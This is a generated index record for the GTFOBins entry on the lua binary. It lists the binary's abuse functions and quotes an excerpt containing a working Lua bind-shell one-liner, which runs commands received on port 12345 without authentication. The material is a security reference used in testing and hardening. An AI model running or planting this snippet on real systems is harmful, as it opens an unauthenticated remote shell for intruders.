---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# lua

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `lua` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lua` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for lua covering bind-shell, download, file-read, file-write, reverse-shell, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/lua.md)
- Source verification: [source record](../../sources/gtfobins/lua.md)

## Aliases

- `lua`

## Source Verification

[source record](../../sources/gtfobins/lua.md)

## Evidence Excerpt

```text
_body: ''
_name: lua
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lua
functions:
bind-shell:
- code: "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n  local c=s:accept();\n  while\
\ true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n\
\  end;c:close();f:close();'"
```
